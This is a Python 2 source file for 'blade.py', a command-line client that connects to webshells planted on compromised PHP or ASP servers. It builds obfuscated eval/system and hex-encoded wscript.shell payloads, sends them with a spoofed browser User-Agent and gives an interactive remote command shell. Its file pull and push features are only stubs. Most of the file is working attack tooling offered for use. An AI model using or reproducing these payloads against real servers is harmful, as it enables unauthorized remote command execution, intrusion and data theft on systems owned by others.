#! /usr/bin/python
# coding:utf-8

import sys, getopt
import re
import base64
import httplib2
from urllib import urlencode




class Connector(object):
    """The base class for all functions"""

    # Constructor
    # para: url, password, server
    # retuen: none
    def __init__(self, url, password, server):
        self.url = url
        self.password = password
        self.server = server
    
    # Request server with GET method
    # param: data
    # return: none
    def getToServer(self, data):
        status = 'success'
        param = urlencode(data)
        header = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        h = httplib2.Http(timeout = 7)
        resp, content = h.request(self.url + '?' + param, "GET", headers = header)
        if resp['status'] != '200':
            print 'HTTP status code: ' + resp['status']
            status = 'fail'
        return status, content

    # Request server with POST method
    # param: data
    # return: none
    def postToServer(self, data):
        status = 'success'
        param = urlencode(data)
        header = {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        h = httplib2.Http(timeout = 7)
        resp, content = h.request(self.url, "POST", param, header)
        if resp['status'] != '200':
            print 'HTTP status code: ' + resp['status']
            status = 'fail'
        return status, content

    # Test whether the connection is functional or not
    # param: none
    # return: statu
    def launch(self):
        # Test the connection
        return self.getToServer({})[0]




class WebShellConnector(Connector):
    """Webshell function"""

    # Constructor
    # param: url, password, server
    # return: none
    def __init__(self, url, password, server):
        Connector.__init__(self, url, password, server)
        self.osType = ''

    # Get OS type of the host
    # param: none
    # return: osType
    def setOsType(self):
        if self.server == 'asp' or self.server == 'aspx':
            self.osType = 'windows'
        else:
            self.osType = 'unix'
            os = self.runCmd('uname', '.')[0]
            if os == 'Linux' or os == 'AIX' or os == 'HP-UX' or os == 'Sun OS' or os == 'Solaris' or os == 'Mac OS X':
                pass
            else:
                self.osType = 'windows'

    # Get a command excute payload with a command
    # param: server, password, cmd, pwd
    # return: payload
    def getPayload(self, server, osType, password, cmd, pwd):
        if osType == 'windows':
            currentDirCmd = 'cd'
            divSymble = '&'
        else:
            currentDirCmd = 'pwd'
            divSymble = ';'
        if server == 'php':
            cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
            payload = {}
            payload['c0'] = base64.b64encode('system("' + cmd + '");')
            payload[password] = '@eval(base64_decode($_REQUEST["c0"]));'
            return payload
        elif server == 'asp':
            cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
            payload = {}
            payload['z2'] = cmd.encode('hex')
            payload['z1'] = '636D64'
            payload[password] = 'Execute("Execute(""On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Execute(""""On Error Resume Next:""""&bd(""""53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E657865632822222222266264285265717565737428227A3122292926222222202F6320222222266264285265717565737428227A322229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329"""")):Response.End"")")'
            return payload
        elif server == 'aspx':
            pass
        elif server == 'jsp':
            pass

    # Send a command to server
    # param: cmd, pwd
    # return: result, newCmd
    def runCmd(self, cmd, pwd):
        if self.osType == '':
            self.setOsType()
        payload = self.getPayload(self.server, self.osType, self.password, cmd, pwd)
        status, result = Connector.postToServer(self, payload)
        if self.osType == 'windows':
            newPwdObj = re.search(r'\[S\]\r\n.*\r\n\[E\]', result)
            newPwd = newPwdObj.group()[5:-5]
            result = result[:-len(newPwdObj.group()) - 2]
        else:
            newPwdObj = re.search(r'\[S\]\n.*\n\[E\]', result)
            newPwd = newPwdObj.group()[4:-4]
            result = result[:-len(newPwdObj.group()) - 2]
        return result, newPwd

    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        try:         
            if Connector.launch(self) != 'fail':
                self.setOsType()
                if self.osType == 'unix':
                    cmd = 'uname -a'
                else:
                    cmd = 'ver'
                pwd = '.'
                while cmd != 'exit':
                    result, newPwd = self.runCmd(cmd, pwd)
                    print result
                    pwd = newPwd
                    cmd = raw_input('$ ')
            else:
                print 'The shell script can not work properly'
        except KeyboardInterrupt:
            pass
        except AttributeError:
            print 'Command can not run'
            print 'Check if the password or server type is incorrect'    
        except Exception:
            print 'Can not get shell'
            print 'Check if the URL is incorrect'




class FileConnector(Connector):
    """File opreation functions"""
    
    # Constructor
    # param: url, password, server, fileList
    # return: none
    def __init__(self, url, password, server, fileList):
        Connector.__init__(self, url, password, server)
        self.fileList = fileList

    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        return Connector.launch(self)




class PullConnector(FileConnector):
    """Pull class"""

    # Constructor
    # param: url, password, server, fileList
    # return: none
    def __init__(self, url, password, server, fileList):
        FileConnector.__init__(self, url, password, server, fileList)

    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        if FileConnector.launch(self) != 'fail':
            print 'Pull launched!', self.fileList




class PushConnector(FileConnector):
    """Push class extends from FileConnector"""

    # Constructor
    # param: url, password, server, fileList
    # return: none
    def __init__(self, url, password, server, fileList):
        FileConnector.__init__(self, url, password, server, fileList)

    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        if FileConnector.launch(self) != 'fail':
            print "Push launched!", self.fileList




class Launcher(object):
    """The core class which start the whole app"""

    # App entry point
    # param: none
    # return: none
    @classmethod
    def main(self):
        config = self.getConfig()
        if self.configIsError(config):
            self.printHelp()
            return
        connector = self.getConnector(config)
        connector.launch()

    # Print the help text to screen
    # param: none
    # return: none
    @classmethod
    def printHelp(self):
        print 'Params error!'
        print ''
        print 'There are some examples for using:'
        print 'Connect a WebShell:'
        print '    python blade.py -u http://yourhost:80 -p cmd -s php --shell'
        print 'Download a file:'
        print '    python blade.py -u http://yourhost:80 -p cmd -s php --pull /home/xx.txt /home/xx.txt'
        print 'Upload a file:' 
        print '    python blade.py -u http://yourhost:80 -p cmd -s php --push /home/xx.txt /home/xx.txt'

    # Get the config Json object from args
    # param: none
    # retuen: config
    @classmethod
    def getConfig(self):
        try:
            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:', ['shell', 'pull', 'push'])
        except:
            return 'error'
        config = {
            'url': '',
            'password': '',
            'server': '',
            'shell': False,
            'pull': [],
            'push': [],
        }
        for option, value in opts:
            if option == '-u':
                config['url'] = value
            elif option == '-p':
                config['password'] = value
            elif option == '-s':
                config['server'] = value
            elif option == '--shell':
                config['shell'] = True
            elif option == '--pull':
                config['pull'] = args
            elif option == '--push':
                config['push'] = args
        return config

    # Check if the Json object config has any errors
    # param: config
    # return: bool
    @classmethod
    def configIsError(self, config):
        if config == 'error':
            return True
        else:
            if config['url'] == '' or config['password'] == '' or config['server'] == '':
                return True
            elif config['shell'] == True and len(config['pull']) == 0 and len(config['push']) == 0:
                return False
            elif config['shell'] == False and len(config['pull']) == 2 and len(config['push']) == 0:
                return False
            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 2:
                return False
            elif config['shell'] == False and len(config['pull']) == 0 and len(config['push']) == 0:
                return False
            else:
                return True

    # Thie is a factory, to get the instance of opreational object
    # param: config
    # return: connector
    @classmethod
    def getConnector(self, config):
        if config['shell'] == True:
            connector = WebShellConnector(config['url'], config['password'], config['server'])
        elif len(config['pull']) == 2:
            connector = PullConnector(config['url'], config['password'], config['server'], config['pull'])
        elif len(config['push']) == 2:
            connector = PushConnector(config['url'], config['password'], config['server'], config['push'])
        else:
            connector = Connector(config['url'], config['password'], config['server'])
        return connector




if __name__ == '__main__':
    Launcher.main()